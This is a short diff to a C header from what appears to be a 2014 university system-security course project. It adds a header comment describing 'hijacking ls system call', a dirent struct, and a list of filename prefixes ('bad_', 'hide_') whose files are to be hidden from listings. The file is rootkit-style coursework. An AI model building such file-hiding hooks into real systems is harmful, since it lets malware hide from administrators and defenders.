@@ -1,3 +1,13 @@
+/**********************************************************
+	Last Updated: Nov 1, 2014
+	CSE509 System Security 2014 Fall @CS SBU
+	Written By: 
+		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
+		Yaohui Chen (yaohchen@cs.stonybrook.edu)
+
+	Description: Headers for hijacking 'ls' system call
+***********************************************************/
+
 static struct dirent
 {
 	uint64_t		d_ino;
@@ -6,7 +16,6 @@ static struct dirent
 //	unsigned char	d_type;
 	char		d_name[];
 };
-
 
 char *(hide_prefix[]) = {"bad_","hide_"};
 
